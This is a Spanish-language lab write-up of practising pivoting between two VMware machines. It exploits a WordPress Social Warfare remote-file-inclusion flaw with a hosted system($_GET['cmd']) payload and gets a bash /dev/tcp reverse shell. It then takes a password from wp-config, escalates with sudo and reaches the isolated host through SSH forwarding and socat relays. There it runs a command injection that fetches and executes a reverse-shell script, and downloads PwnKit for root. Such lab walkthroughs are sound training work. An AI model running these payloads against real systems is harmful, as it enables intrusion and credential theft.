Para esta lección estaremos practicando Pivoting con estas 2 maquinas por lo que prepararemos el entorno de VMware para lograr tener una infraestructura separada para ejecutar el pivoting

Lo primero es entrar al modo de edicion del Grub para modificar los nombres de las interfaces de las VM para porder conectar la nueva red que creamos interna para aislar una de las maquinas y acceder a ella mediante la otra en este caso la PC aislada sera DVM y accederemos a ella mediante WPOWN

1- Reiniciamos las maquias y precionamos E en 2 ocaciones para enrtrar al modo de edicion del GRUB

2- Editamos la linea que dice **ro quiet** y lo sustituimos por **rw init=/bin=bash**  prcionamos Crtl+X esto reniciara la pc y nos abre con una consola en modo de root

Despues dentro de la maquina modificaremos el fichero

```
nano /etc/network/interface
```

donde a la nueva interface de red que agregamos le daremos la opcionde que obtenga la direccion ip por **DHCP** Esto es en la maquina WPOWN que es un Debian

Para la maquina **DMV** haremos los pasos 1 y 2 anteriores y modificaremos el fichero 
```
nano /etc/netplan/fichero.yaml
```

Debido que esta asignando el dhcp a una interface que no tenemos y debemos ponerle la que realmente tine la pc esto lo vemos con el comando **ip a**
en nuestro caso la interface es **ens33** esto lo sustituimos en el archivo **.yaml**

Utilizamos la herrmienta arp-scan para hacer un barrido de la red y detectar las maquinas que estan en nuestra red

```
**arp-scan -I ens33 --localnet --ignoredup**s
```

```
-I indica la interface por la que se va a realizar el scan

--localnet indica que lo haga en la red local

--ignoredups indica que ignore ips duplicadas
```

Para saber el shell que estamos utilizando utilizamos 
```
echo $SHELL
```

Creamos una estructura de directorios para trabajar organizadamente

```
mkdir content exploit nmap
```

le haceos un ping a la maquina detectada con el scaneo arp

```
ping -c 192.168.1.12
```

Obtenemos una respuesta positiva y nos fijamos en el ttl enn el cual detectamos **ttl=64** por lo que se infiere es una **PC Linux , Windoes si el ttl=128**

**NOTA :**

Nos descargamos un script de Savitar para identificar si estamos ante un maquina linux o windows **wichSystem.py**  lo copiamos en /usr/bin y le damos permisos de ejecucion al fichero chmod +x **wichSystem.py**

y lo podremos ejecutar de cualquier lugar ya que /usr/bin esta en nuestro **$PATH**

Ahora realizaremos un scaneo de vulnerabilidades con nmap para ver los puertos habiertos los cuales pudieramos utilizar para comenzar la explotacion de vulnerabilidades

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.12
```

Con los puertos detectados hacemos un escaneo donde probamos los scripts basicos de nmap con la opcion  **-sC**

```
nmap -sC -sV -p22,80 192.168.1.12 -oN targeted
```

**-oN** exporta a un formato nmap que es idonea para guardar en un archivo exactamente lo que e reporta nmap

Al ver el puerto 80 abierto le ejecutaremos un script especifico para enumerar los archivos en el servidor y lo hacemos con nmap

```
nmap --script http-enum -p80 192.168.1.12
```

Al realizar el scan encontramos un worldpres y realizamos un **whatweb** para ver si obtenemos mas informacion

```
whatweb http://192.168.1.12
```

**`whatweb`** es una herramienta de **reconocimiento web** (web reconnaissance) utilizada principalmente en **pentesting** (pruebas de penetración) y **auditorías de seguridad** para identificar **tecnologías y servicios** que utiliza un sitio web.

Nos vamos al navegador y vemos un sitio web el cual intentaremos acceder a los directorios detectados en el scan anterior

**wordpress/**

**wordpress/login.php**

**ademas intentaremos**

**wordpress/wp-content**

```
wordpress/wp-content/plugins #Que son directorios comunes de worldpress y además son muy buenos vectores de entrada
```

Mas adelante hacemos un culr a la pagina para ver los plugins que realmente esta utilizando

```
curl -s -X "http://192.168.1.12/worldpress" | grep -oP "/plugins/\**K[^.*/]+" | sort -u
```

Nos instalamos searchexploit para hacer busqueda de exploit desde la consola **sudo apt -y install exploitdb** y realizamos una busqueda de exploit del plugin encontrado que es warfare de worldpress

```
searchexploit warfare
```

Revisando los conceptos del script vemos que nos indica agregar una sentencia a la url del wordpres e insertarle codigo, en este caso para que envie una peticion a un servidor de nuestra propiedad y ejecute codigo que le enviemos en la respuesta para esto nos crearemos un servidor cm python3 para hacer pruebas

```
python3 -m http.server 80**
```

Investigamos como el script que descargamos y nos da unas referencias en github donde nos explican un poco de que va en el cual nos pide crear un fichero **payload.txt** al cual le agregaremos la siguiente linea 

<pre>system('cat /etc/passwd')</pre>

y volvemos a levantar el servidor de python y llamamos desde la url de worldpress a este fichero

```
http://192.168.1.12/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.1.97/payload.txt
```

Esto nos devuelve el contenido del fichero passwd del servidor objetivo , verificamos si realmente la info viene de alli cambiando el comando en el payload para ver las ip del servidor y verificar que no son las de uestro equipo

<pre>system('hostname -I')</pre>

Para controlar el comando a introducir hacemos una modificacion en el payload

<pre>system($_GET['cmd'])</pre>

Una vez modificado en la url agregamos un &cmd como parametro que es el que pusimos en el payload y le agregamos el comando

http://192.168.1.12/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.1.97/payload.txt&cmd=ls

Con la premisa de que podemos ejeutar codigo en la maquina habriremos un puerto de escucha en nuestra pc e intentremos crear una coneccion desde el servidor a nuestra maquina esto lo haremos con netcat 
```
nc -nlvp 443
```

y posteriormete le enviamos por la url la peticion de conexion oneliner reverse shell 
```
bash -c "bash -i >& /dev/tcp/192.168.1.97/443 0>&1"  
```

es recomendable cambiar el & por su equivalente en urlencode cullo valor es %26  

```
bash -c "bash -i >%26 /dev/tcp/192.168.1.97/443 0>%261" 
```


Ahora haremos un tratamiento de la consola pues no estamos operando desde una tty
utilizamos el comando **tty**  el cual nos responde que no es una tty

Lo siguiente es un truco clásico de Unix/Linux que **abre una nueva shell "limpia"** usando el comando `script`, pero **sin guardar un archivo de registro**

```
 script /dev/null -c bash 
```

 precionamos Ctrl+z para pausar nc y ejecutamos el comando 
```
 stty raw -echo; fg
```
 
 y luego reseteamos la terminal con 
```
 reset xterm 
```
 
 esto nos permitira precionar Ctrl+c sin sacarnos del la terminal remota 
 luego revisamos **echo $TERM** para cambiar su valor a **xterm**  **export TERM=xterm** esto nos permitira utilizar **Ctrl+l** 
 
 Ahora modificaremos las dimenciones de la tty para trabajar mejor
 Revisamos el tamanno del **tty** 
```
 stty size  
```
 y revisamos el de nuestra consola para agregarlo a la de la maquina objetivo como:
```
stty rows 43 columns 184 
```
esos son los valores de nuestra consola personal

Buscamos algun usuario que tenga permiso de ejecucion de una bash
```
grep "sh$" /etc/passwd   

```
Obtenemos uno que es takis

Buscamos si hay alguna contrasenna seteada en e fichero de configuracion de worlpress
```
cat wp-config.php | grep -A 3 "password" #Obtenemos 1  'R3&]vzhHmMn9,:-5'
```

probamos el usuario y la contraseña encontrada y pues accedemos al usuario pudiendo asi hacer una migración de usuario

Utilizamos comando **id** para ver a que grupos pertenece.


hacemos con el usuario takis un sudo -l y nos arroja que tine permitido ejecutar cualquier comando sin necesidad de password por lo que escalamos privilegios con 

```
sudo su
```

nos vamos al directorio de root donde nos deja un mensaje y luego hacemos una búsqueda de algun archivo que contenga USB que es parte del mensaje dejado en el fichero que nos dejo root
```
find / -name `\*USB\*
```

este comando hace una busqueda desde la raiz de algun fichero que contenga USB en su nombre encontramos un archivo donde esta la flag a partir de aqui vamos a utilizar esta maquina como pivoting para atacar nuestra siguiente maquina

# Pivoting

**which** -> comando para encontrar programas donde estan instalados .  
```
which ping
```

Detectamos que hay mas de una ip en la pc por lo que haremos un host discoveri con bash en la maquina objetico para detectar otra pc en la red
hostDiscovery.sh

```
#!/bin/bash
for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 10.10.10.$i" &>/dev/null && echo "[+] La IP esta activa" &
done
```

EL **&** al final de la line lo que dice es que siga a la siguiente ejecucion que lo realice en paralelo,  para ver si hay puertos habiertos  en este caso el puerto 22
```
echo '' > /dev/tcp/10.10.10.128/22
echo $?    
```

Te da el codigo de estado del comando anterior 0 si obtuvo algo de lo contrario otro numero
Ahora haremos un portDiscovery.sh

```
#!/bin/bash
for port in $(seq 1 25); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.10.128/$port" &>/dev/null && echo "[+] El puerto $port esta abierto" || echo "[+] El puerto esta cerrado" &
done; wait
```

Podemos omitir despues del || para no tener que mostrar todos los pueros que no estan habiertos a fin de cuentas son 65335, version mas acertada del script

```
#!/bin/bash
for port in $(seq 1 25); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.10.128/$port" &>/dev/null && echo "[+] El puerto $port esta abierto" &
done; wait
```

Vemos que tiene el puerto 80 habierto y vamos a intentar traerno ese puerto a nuestra maquina para poder realizar un ataquea esa otra maquina, aqui haremos chisel para traernos esta ip a nuestra maquina

1 - Nos conectaremos a la maquina intermedia mediante ssh desde nuestra terminal con el usuario **takis** y pass **'R3&]vzhHmMn9,:-5'** haciendo un **port forwardin** a la maquina que esta en la red a la que directamente no tenemos acceso sino mediante la maquina que ya comporometimos

```
ssh -L 80:10.10.10.128:80 takis@192.168.1.12
```

2- Abrimos un navegador  y navegamos al localhost y vemos la pagina que esta expuesta a la red de la tercera maquina mediante la maquina intermedia

3 - Reenviamos todas la peticiones a Burpsuit para interceptarlas y enviarla al repiter para ver su resuesta ,decodificamos la url de la peticion y verificamos que es un peticion a youtube lo que se esta enviando reenviamos la peticion y vemos la respuesta.
4- Aqui nos percatamos de que la hrramienta yt_url puede ejecutar comandos en su interios asi que probamos **$(whoami)** es decir le pasamos este comando por parametros para ver su comportamiento. Efectivamente devuelve informacion del sistema pero no completamente
5.le pondremos un parametro y lo enviaremos al intruder para de ahi hacer mas pruebas
6- Utilizamos los payloads de la libreria de github SecList que es una libreria para hacer pruebas para cargarle los ficheros al BUrpsuit , como bursuit no nos permitio porque habia cosas que necesitaban una licencia utilizamos Caido.io
7- Identificamos que pasandole unos parametors de una lista de caractres de la libreria que descargamos special.chsts.txt , esto lo hicimos de manera automatica . Obtuvimos buenos resultados con el simbolos < asi que le pasamos \<\`cat${IFS}/ets/passwd\`  
8 - Realizamos peticiones desde el Replay con esa estructura

#### SUPER IMPORTANTE ESTABLECER LA CONEXION DE LA MAQUINA AISLADA MEDIANTE LA INTERMEDIA
Ahora intentaremos establecen una conexion por **socat** desde la maquina DVM a treves  de la maquina wpown hacia nuestro equipo 
Este lo haremos para ejecutar un fichero de nuesro servidor que contiene un conexion reversa
maquina wpown
socat TCP-LISTEN:4545,fork TCP:192.168.1.97:2323

Levantamos en nuestra pc un servidor con python 
python -m http.server 2323

en la maquina intermedia redirigimos las peticiones al puerto 4747 hacia 192.168.1.97:2323
socat TCP/LISTEN:4545,fork TCP:192.168.1.97:2323

desde caido enviamos una peticion culr al puerto 4545

yt_url=\<\`cat${IFS}10.10.10.129:4545\`  

al ver que recibimos en el servidor de python la peticion creamos un fichero **index.html** para en el poner una ejecucion de shell remota

**#!/bin/bash**
**bash -i >& /dev/tcp/10.10.10.129/1212 0>&1**

esto lo que hace es establecer una coneccion a la maquina intermedia al puerto 1212 y en la maquina intermedia vamos a redirigir el trafico de ese puerto a nuestra maquina  a otro puerto 

**socat TCP-LISTEN:1212,fork TCP:192.168.1.97:3131**

luego escuchamos en nuestra maquina con netcat en el puerto destino que le indicamos arriba
**nc -nvlp 3131**

y desde caido enviamos la peticion esta ves con un bash agregado para que ejecute lo que hay dentro del fichero inde.html

yt_url=\<\`cat${IFS}10.10.10.129:4545 |bash \`

luego creamos la consola interactiva como anteriormente hicimos

script /dev/null -c bash 
 precionamos Ctrl+z para pausar nc y ejecutamos el comando 
 **stty raw -echo; fg**  
 y luego reseteamos la terminal con 
 **reset xterm** 
 esto nos permitira precionar Ctrl+c sin sacarnos del la terminal remota 
 luego revisamos **echo $TERM** para cambiar su valor a **xterm**  **export TERM=xterm** esto nos permitira utilizar **Ctrl+l** 
 Ahora modificaremos las dimenciones de la tty para trabajar mejor
 Revisamos el tamanno del tty 
 **stty size**  y revisamos el de nuestra consola para agregarlo a la de la maquina objetivo como:
**stty rows 43 columns 184** esos son los valores de nuestra consola personal

despues de acceder intentaremos elevar privilegios
**sudo -l** para ve si nuestro usuario tiene algun privilegio especial
**id** para ver si estamos en algun grupo interesante
**find / -perm 4000 2>/dev/null**
Detectamos que tenemos varios ficheros con estos permisos y despues de una investigacion encontramos **/usr/bin/pkexec** se puede explotar para escalar privilegios con **PwnKit**

Desde nuestra maquina nos descargamos **PwnKit** y desde la maquina objetivo mediante los socat  lo llevamos a la pc 

Descargamos el archivo desde nuestra maquina
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

Nos movemos a tmp para podes descargar el archivo **cd /tmp**
wget http://10.10.10.129:4545/PwnKit

le damos permisos
**hmod +x PwnKit**

lo ejecutamos **./PwnKit**   y obtenemos privilegios de **root**
nos vamos al home de root y encontramos la flag